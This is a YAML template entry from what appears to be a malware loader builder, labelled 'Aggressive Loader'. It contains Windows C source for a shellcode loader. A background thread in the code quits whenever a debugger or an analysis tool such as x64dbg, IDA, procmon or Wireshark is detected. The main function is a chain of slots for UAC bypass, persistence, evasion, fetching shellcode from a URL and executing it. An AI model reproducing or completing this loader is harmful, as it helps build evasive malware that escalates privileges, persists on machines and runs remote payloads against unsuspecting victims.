- id: aggressive
  display: Aggressive Loader
  description: Heavy anti-analysis and active debugger countermeasures.
  content: |
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>
    #include <winternl.h>
    #include <intrin.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <shellapi.h>
    #include <iphlpapi.h>
    #include <lm.h>
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "netapi32.lib")
    #pragma comment(lib, "shell32.lib")

    {{PREAMBLE}}

    {{PROCESS_LOOKUP_HELPER}}

    // Self-protection thread
    DWORD WINAPI AntiAnalysisThread(LPVOID lpParam) {
        while (TRUE) {

            // Continuous debugger check
            if (IsDebuggerPresent()) ExitProcess(0);

            // Check for debugging tools
            const wchar_t* tools[] = {L"x64dbg.exe", L"ida.exe", L"procmon.exe", L"wireshark.exe"};
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe = {sizeof(pe)};
                if (Process32FirstW(snap, &pe)) {
                    do {
                        for (int i = 0; i < 4; i++) {
                            if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {
                                CloseHandle(snap);
                                ExitProcess(0);
                            }
                        }
                    } while (Process32NextW(snap, &pe));
                }
                CloseHandle(snap);
            }
            Sleep(1000);
        }
        return 0;
    }

    INT main(VOID)
    {
        // Start continuous monitoring
        CreateThread(NULL, 0, AntiAnalysisThread, NULL, 0, NULL);
        {{ANTI_EMULATION}}
        {{ANTI_ANALYSIS}}
        {{ANTI_DEBUGGING}}
        {{UAC_BYPASS}}
        {{PERSISTENCE}}
        {{EVASION}}
        {{SHELLCODE_SOURCE}}
        {{SHELLCODE_URL}}
        {{SHELLCODE_EXECUTION}}
        return 0;
    }
